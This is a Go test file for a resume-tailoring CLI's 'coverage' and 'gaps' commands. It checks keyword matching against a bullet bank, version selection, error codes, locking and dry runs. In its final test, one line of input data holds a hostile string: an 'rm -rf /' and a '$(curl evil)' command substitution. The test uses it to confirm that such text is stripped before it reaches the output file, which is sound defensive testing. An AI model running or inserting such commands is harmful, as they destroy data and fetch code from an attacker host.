package main

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/bharathvbcr/Vani/internal/filelock"
	"github.com/bharathvbcr/Vani/internal/ledger"
	"github.com/bharathvbcr/Vani/internal/posting"
	"github.com/bharathvbcr/Vani/internal/rkbcoverage"
)

// The coverage commands run in process against the resume tests' fakes: a
// synthetic bank (b1 "Cut latency by 42%.", b2 "Built a tracing pipeline for
// evaluation."), a ledger posting whose text names Python, TypeScript, agents and
// kernels, and the tailored version v1 whose jd_keywords are research, tools,
// Python, TypeScript, evaluation, tracing, latency, agents. No model is asked.

func jrCoverage(t *testing.T, args ...string) resumeCoverageReply {
	t.Helper()
	out, _ := jrRun(t, 0, "", append([]string{"coverage", "--json"}, args...)...)
	var r resumeCoverageReply
	if err := json.Unmarshal([]byte(out), &r); err != nil {
		t.Fatalf("not a coverage reply: %q (%v)", out, err)
	}
	// Every list is a list on the wire, never null.
	m := jrObject(t, out)
	for _, k := range []string{"hit", "miss", "uncovered", "unjudged", "unresolved", "gap_missing"} {
		if _, ok := m[k].([]any); !ok {
			t.Errorf("%s = %v, want a list", k, m[k])
		}
	}
	return r
}

func hitNames(r resumeCoverageReply) []string {
	var out []string
	for _, h := range r.Hit {
		out = append(out, h.Term)
	}
	sort.Strings(out)
	return out
}

func sorted(l []string) []string {
	out := append([]string{}, l...)
	sort.Strings(out)
	return out
}

func sameSet(a, b []string) bool {
	return strings.Join(sorted(a), "|") == strings.Join(sorted(b), "|")
}

// jcSeed adds a posting with annotations to the ledger under state.
func jcSeed(t *testing.T, state, key, desc string, ann map[string]string) {
	t.Helper()
	l, err := ledger.Open(filepath.Join(state, "ledger"))
	if err != nil {
		t.Fatal(err)
	}
	defer l.Close()
	p := posting.Posting{Key: posting.Key(key), ATS: "gh", Company: "Globex", Title: "Platform Engineer", Location: "Austin, TX", Description: desc, URL: "https://boards.invalid/" + key}
	e := ledger.Event{V: 1, At: time.Date(2026, 10, 20, 9, 0, 0, 0, time.UTC), Key: p.Key, Status: posting.Scored, Posting: &p, Annotations: ann}
	if err := l.Append(context.Background(), e); err != nil {
		t.Fatal(err)
	}
}

func TestJobsResumeCoverageOfTheCurrentVersionSplitsHitMissAndUncovered(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	_, prov := jrTailor()
	jrSetup(t, f, prov)
	jrBuild(t) // v1, current, with its jd_keywords

	r := jrCoverage(t, jrKey)
	if r.Key != jrKey || r.Version != 1 || r.Base {
		t.Fatalf("reply = %+v", r)
	}
	if r.KeywordsSource != "posting+jd_keywords" {
		t.Errorf("keywords_source = %q", r.KeywordsSource)
	}
	// The bank's two bullets say latency, tracing and evaluation; both are chosen.
	for _, want := range []string{"latency", "tracing", "evaluation"} {
		found := false
		for _, h := range r.Hit {
			found = found || h.Term == want
		}
		if !found {
			t.Errorf("%q is not a hit: %v", want, hitNames(r))
		}
	}
	for _, h := range r.Hit {
		if h.Term == "tracing" && (len(h.Bullets) != 1 || h.Bullets[0] != "b2" || h.N != 1) {
			t.Errorf("tracing = %+v", h)
		}
	}
	// Nothing the bank holds says Python or TypeScript: a miss no swap can fix.
	for _, want := range []string{"Python", "TypeScript"} {
		if !contains(r.Miss, want) || !contains(r.Uncovered, want) {
			t.Errorf("%q: miss %v uncovered %v", want, r.Miss, r.Uncovered)
		}
	}
	for _, u := range r.Uncovered {
		if !contains(r.Miss, u) {
			t.Errorf("%q is uncovered but not a miss", u)
		}
	}
	if len(r.Unresolved) != 0 {
		t.Errorf("unresolved = %v", r.Unresolved)
	}
}

func contains(l []string, s string) bool {
	for _, x := range l {
		if x == s {
			return true
		}
	}
	return false
}

func TestJobsResumeCoverageNamesTheVersionAskedFor(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrTwoVersions(t, f) // v1 tailored (b2, b1; jd_keywords), v2 edited (b1 only), v2 current

	cur := jrCoverage(t, jrKey)
	if cur.Version != 2 || cur.Base {
		t.Fatalf("default = v%d base %v, want the current v2", cur.Version, cur.Base)
	}
	// v2 chose only b1: tracing and evaluation (b2's) are not hits there.
	if contains(hitNames(cur), "tracing") || contains(hitNames(cur), "evaluation") {
		t.Errorf("v2 hits = %v", hitNames(cur))
	}
	v1 := jrCoverage(t, jrKey, "v1")
	if v1.Version != 1 || !contains(hitNames(v1), "tracing") {
		t.Errorf("v1 = %+v", v1)
	}
	// v2 is an owner's edit with no jd_keywords of its own: its terms are the posting's.
	if cur.KeywordsSource != "posting" || v1.KeywordsSource != "posting+jd_keywords" {
		t.Errorf("sources: v2 %q, v1 %q", cur.KeywordsSource, v1.KeywordsSource)
	}
}

func TestJobsResumeCoverageAMissSomeEligibleBulletCoversIsNotUncovered(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrSetup(t, f, nil)
	// A bank bullet that says Python, eligible, in the pool but in no chosen list.
	jrBankDoc(t, []string{"b1", "b2", "b3"}, map[string]map[string]any{"b3": reviewedBullet("Built Python tooling.", "Built Python tooling.")})
	jrRun(t, 0, jrEditOf("alpha-job", "b1"), "render", "--json", "--fit", jrKey)

	r := jrCoverage(t, jrKey, "v1")
	if !contains(r.Miss, "Python") || contains(r.Uncovered, "Python") {
		t.Errorf("Python: miss %v uncovered %v", r.Miss, r.Uncovered)
	}
	if !contains(r.Uncovered, "TypeScript") {
		t.Errorf("TypeScript is covered by nothing: uncovered %v", r.Uncovered)
	}
}

func TestJobsResumeCoverageATermOnlyInAnIneligibleBulletIsUncovered(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrSetup(t, f, nil)
	// b3 says CUDA and Kubernetes but nobody reviewed it: it is not eligible.
	jrBankDoc(t, []string{"b1", "b2", "b3"}, map[string]map[string]any{"b3": {"text": "Wrote CUDA for Kubernetes clusters."}})
	jcSeed(t, os.Getenv("VANI_STATE_DIR"), "gh:globex:7", "We use CUDA and Kubernetes every day.", nil)

	r := jrCoverage(t, "gh:globex:7")
	if !r.Base || r.Version != 0 || r.KeywordsSource != "posting" {
		t.Fatalf("reply = %+v", r)
	}
	if !sameSet(r.Uncovered, []string{"CUDA", "Kubernetes"}) || !sameSet(r.Miss, []string{"CUDA", "Kubernetes"}) || len(r.Hit) != 0 {
		t.Errorf("hit %v miss %v uncovered %v", hitNames(r), r.Miss, r.Uncovered)
	}
}

func TestJobsResumeCoverageOfAJobWithNoVersionIsTheBaseSelection(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrSetup(t, f, nil)
	jrBankDoc(t, []string{"b1", "b2"}, map[string]map[string]any{"b1": reviewedBullet("Built Python tooling.", "Built Python tooling.")})
	r := jrCoverage(t, jrKey)
	if !r.Base || r.Version != 0 {
		t.Fatalf("reply = %+v", r)
	}
	if !contains(hitNames(r), "Python") {
		t.Errorf("the base selection lists b1, which says Python: hit %v", hitNames(r))
	}
	out, _ := jrRun(t, 0, "", "coverage", "--json", jrKey)
	if m := jrObject(t, out); m["base"] != true || m["version"] != nil {
		t.Errorf("reply = %v", m)
	}
}

func TestJobsResumeCoverageSaysWhenAChosenBulletIsNoLongerOffered(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	_, prov := jrTailor()
	jrSetup(t, f, prov)
	jrBuild(t) // v1 chose b2 and b1
	jrBankDoc(t, []string{"b1"}, nil, "b2")

	r := jrCoverage(t, jrKey, "v1")
	if len(r.Unresolved) != 1 || r.Unresolved[0] != "b2" {
		t.Errorf("unresolved = %v", r.Unresolved)
	}
	// b2 said tracing and evaluation; they are not covered now, and nothing offers them.
	if !contains(r.Uncovered, "tracing") || contains(hitNames(r), "tracing") {
		t.Errorf("hit %v uncovered %v", hitNames(r), r.Uncovered)
	}
}

func TestJobsResumeCoverageJoinsDevPrismsGapMissing(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrSetup(t, f, nil)
	jcSeed(t, os.Getenv("VANI_STATE_DIR"), "gh:globex:8", "Python and CUDA.", map[string]string{ledger.AnnMissing: "cuda; Kubernetes (weak); a made-up skill nobody lists"})
	r := jrCoverage(t, "gh:globex:8")
	if !sameSet(r.GapMissing, []string{"CUDA", "Kubernetes"}) {
		t.Errorf("gap_missing = %v", r.GapMissing)
	}
	// Terms only: the annotation's free text never reaches the reply.
	out, _ := jrRun(t, 0, "", "coverage", "--json", "gh:globex:8")
	if strings.Contains(out, "made-up") || strings.Contains(out, "nobody lists") {
		t.Errorf("annotation text in the reply: %s", out)
	}
}

func TestJobsResumeCoverageSpendsNothingAndTakesNoLock(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	p, prov := jrTailor()
	state, st := jrSetup(t, f, prov)
	jrBuild(t)
	asked := len(p.reqs)
	before, _ := st.List(jrKey)
	jrHoldBuildLock(t, state)
	jrCoverage(t, jrKey)
	if len(p.reqs) != asked {
		t.Error("coverage asked the model")
	}
	if after, _ := st.List(jrKey); len(after) != len(before) {
		t.Error("coverage saved a version")
	}
	if _, err := os.Stat(filepath.Join(state, "resumes", "gaps.jsonl")); err == nil {
		t.Error("coverage wrote the gaps file")
	}
}

func TestJobsResumeCoverageRefusals(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrTwoVersions(t, f)
	for _, c := range []struct {
		name string
		args []string
		code string
	}{
		{"unknown key", []string{"gh:nobody:9"}, "unknown_key"},
		{"bad key", []string{"gh:a\x07"}, "bad_request"},
		{"bad version", []string{jrKey, "latest"}, "bad_request"},
		{"zero version", []string{jrKey, "v0"}, "bad_request"},
		{"missing version", []string{jrKey, "v9"}, "not_found"},
	} {
		out, _ := jrRun(t, 1, "", append([]string{"coverage", "--json"}, c.args...)...)
		if r := jrFail(t, out); r.Code != c.code {
			t.Errorf("%s: reply = %+v, want %s", c.name, r, c.code)
		}
	}
	for _, args := range [][]string{{"coverage", "--json"}, {"coverage", "--json", jrKey, "v1", "v2"}, {"gaps", "--json"}, {"gaps", "--json", jrKey, "v1"}} {
		jrRun(t, 2, "", args...)
	}
}

func TestJobsResumeCoverageWhenThePoolCannotBeReadItSaysSoAndGuessesNothing(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrTwoVersions(t, f)
	f.mu.Lock()
	f.err = errors.New("rkb is broken")
	f.mu.Unlock()
	out, _ := jrRun(t, 1, "", "coverage", "--json", jrKey)
	if r := jrFail(t, out); r.Code == "" || strings.Contains(out, `"hit"`) {
		t.Errorf("reply = %s", out)
	}
}

func TestJobsResumeCoverageDeadlineBoundsTheCommands(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrTwoVersions(t, f)
	old := resumeCoverageDeadline
	resumeCoverageDeadline = 1
	t.Cleanup(func() { resumeCoverageDeadline = old })
	for _, sub := range []string{"coverage", "gaps"} {
		out, _ := jrRun(t, 1, "", sub, "--json", jrKey)
		if r := jrFail(t, out); r.Code != "timeout" {
			t.Errorf("%s: reply = %+v", sub, r)
		}
	}
}

func TestJobsResumeCoverageADamagedVersionIsNamedNotGuessed(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	jrTwoVersions(t, f)
	// Corrupt v1's file in place: the store refuses it.
	dir := filepath.Join(os.Getenv("VANI_STATE_DIR"), "resumes")
	ents, _ := os.ReadDir(dir)
	for _, e := range ents {
		if e.IsDir() && !strings.HasPrefix(e.Name(), ".") {
			if err := os.WriteFile(filepath.Join(dir, e.Name(), "v1.json"), []byte("{not json"), 0o600); err != nil {
				t.Fatal(err)
			}
		}
	}
	out, _ := jrRun(t, 1, "", "coverage", "--json", jrKey, "v1")
	if r := jrFail(t, out); r.Code != "damaged" {
		t.Errorf("reply = %+v", r)
	}
}

// ---- gaps ------------------------------------------------------------------------

func jrGaps(t *testing.T, args ...string) resumeGapsReply {
	t.Helper()
	out, _ := jrRun(t, 0, "", append([]string{"gaps", "--json"}, args...)...)
	var r resumeGapsReply
	if err := json.Unmarshal([]byte(out), &r); err != nil {
		t.Fatalf("not a gaps reply: %q (%v)", out, err)
	}
	if m := jrObject(t, out); m["terms"] == nil || m["file"] == nil || m["written"] == nil {
		t.Errorf("reply = %s", out)
	}
	return r
}

func gapLines(t *testing.T, file string) []rkbcoverage.Line {
	t.Helper()
	raw, err := os.ReadFile(file)
	if err != nil {
		t.Fatal(err)
	}
	var out []rkbcoverage.Line
	for _, ln := range strings.Split(strings.TrimSpace(string(raw)), "\n") {
		var l rkbcoverage.Line
		if err := json.Unmarshal([]byte(ln), &l); err != nil {
			t.Fatalf("not a line: %q", ln)
		}
		out = append(out, l)
	}
	return out
}

func TestJobsResumeGapsHandsOverUncoveredTermsAndDevPrismsMissing(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	state, _ := jrSetup(t, f, nil)
	jcSeed(t, state, "gh:globex:7", "We use CUDA and Kubernetes every day.", map[string]string{ledger.AnnMissing: "Rust (weak)"})

	r := jrGaps(t, "gh:globex:7")
	want := filepath.Join(state, "resumes", "gaps.jsonl")
	if !r.Written || r.File != want || r.DryRun || r.Unchanged {
		t.Fatalf("reply = %+v", r)
	}
	if !sameSet(r.Terms, []string{"CUDA", "Kubernetes", "Rust"}) {
		t.Errorf("terms = %v", r.Terms)
	}
	ls := gapLines(t, want)
	if len(ls) != 1 || ls[0].Key != "gh:globex:7" || ls[0].Company != "Globex" || ls[0].Title != "Platform Engineer" || !sameSet(ls[0].Terms, r.Terms) {
		t.Fatalf("lines = %+v", ls)
	}
	if _, err := time.Parse(time.RFC3339, ls[0].At); err != nil {
		t.Errorf("at = %q", ls[0].At)
	}
	if st, err := os.Stat(want); err != nil || st.Mode().Perm() != 0o600 {
		t.Errorf("mode = %v, %v", st.Mode(), err)
	}
	raw, _ := os.ReadFile(want)
	noPersonalData(t, "gaps.jsonl", string(raw))

	// The same call again adds nothing; a second job adds a line.
	again := jrGaps(t, "gh:globex:7")
	if again.Written || !again.Unchanged || len(gapLines(t, want)) != 1 {
		t.Errorf("retry = %+v", again)
	}
	jcSeed(t, state, "gh:globex:8", "Terraform everywhere.", nil)
	if second := jrGaps(t, "gh:globex:8"); !second.Written || !contains(second.Terms, "Terraform") {
		t.Errorf("second = %+v", second)
	}
	if n := len(gapLines(t, want)); n != 2 {
		t.Errorf("%d lines", n)
	}
}

func TestJobsResumeGapsDryRunWritesNothing(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	state, _ := jrSetup(t, f, nil)
	jcSeed(t, state, "gh:globex:7", "CUDA and Kubernetes.", nil)
	r := jrGaps(t, "--dry-run", "gh:globex:7")
	if r.Written || !r.DryRun || !sameSet(r.Terms, []string{"CUDA", "Kubernetes"}) {
		t.Errorf("reply = %+v", r)
	}
	if _, err := os.Stat(r.File); err == nil {
		t.Error("a dry run wrote the file")
	}
	if _, err := os.Stat(r.File + ".lock"); err == nil {
		t.Error("a dry run took the lock")
	}
}

func TestJobsResumeGapsWithNothingToHandOverWritesNothing(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	state, _ := jrSetup(t, f, nil)
	// A posting whose terms the base bullets already cover (b2 says tracing and
	// evaluation, which the vocabulary may or may not hold; a posting with no
	// vocabulary terms at all has nothing to judge).
	jcSeed(t, state, "gh:globex:9", "A friendly team that likes lunch.", nil)
	r := jrGaps(t, "gh:globex:9")
	if r.Written || len(r.Terms) != 0 || r.Note == "" {
		t.Errorf("reply = %+v", r)
	}
	if _, err := os.Stat(r.File); err == nil {
		t.Error("an empty hand-off wrote the file")
	}
}

func TestJobsResumeGapsIsRefusedWhileAnotherProcessWrites(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	state, _ := jrSetup(t, f, nil)
	jcSeed(t, state, "gh:globex:7", "CUDA.", nil)
	held, err := filelock.TryAcquire(filepath.Join(state, "resumes", "gaps.jsonl.lock"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = held.Release() })
	// The wait for the lock is bounded by the command's own deadline: the pool read
	// of the fake is quick, so a short deadline ends the wait, not the read.
	old := resumeCoverageDeadline
	resumeCoverageDeadline = 2 * time.Second
	t.Cleanup(func() { resumeCoverageDeadline = old })
	out, _ := jrRun(t, 1, "", "gaps", "--json", "gh:globex:7")
	if r := jrFail(t, out); r.Code != "busy" {
		t.Errorf("reply = %+v", r)
	}
	if _, err := os.Stat(filepath.Join(state, "resumes", "gaps.jsonl")); err == nil {
		t.Error("written while another process held the lock")
	}
}

func TestJobsResumeGapsRefusals(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	state, _ := jrSetup(t, f, nil)
	for key, code := range map[string]string{"gh:nobody:9": "unknown_key", "gh:a\x07": "bad_request"} {
		out, _ := jrRun(t, 1, "", "gaps", "--json", key)
		if r := jrFail(t, out); r.Code != code {
			t.Errorf("%s: reply = %+v, want %s", key, r, code)
		}
	}
	if _, err := os.Stat(filepath.Join(state, "resumes", "gaps.jsonl")); err == nil {
		t.Error("a refused call wrote the file")
	}
}

func TestJobsResumeGapsTermsAreBoundedAndCleaned(t *testing.T) {
	f := &fakeResumeRKB{pages: 2, pdf: testPDF}
	state, _ := jrSetup(t, f, nil)
	// DevPrism's annotation is JD text: only vocabulary terms pass, and a hostile
	// description cannot put anything but terms in the file.
	jcSeed(t, state, "gh:globex:7", "Python.", map[string]string{ledger.AnnMissing: strings.Repeat("Kubernetes; ", 3000) + "\x1b[31m rm -rf /; $(curl evil)"})
	r := jrGaps(t, "gh:globex:7")
	raw, _ := os.ReadFile(r.File)
	for _, bad := range []string{"rm -rf", "curl", "\x1b", "evil"} {
		if strings.Contains(string(raw), bad) {
			t.Errorf("%q reached the hand-off file", bad)
		}
	}
	if len(r.Terms) > maxGapTerms || len(raw) > rkbcoverage.MaxLineBytes+1 {
		t.Errorf("%d terms, %d bytes", len(r.Terms), len(raw))
	}
}
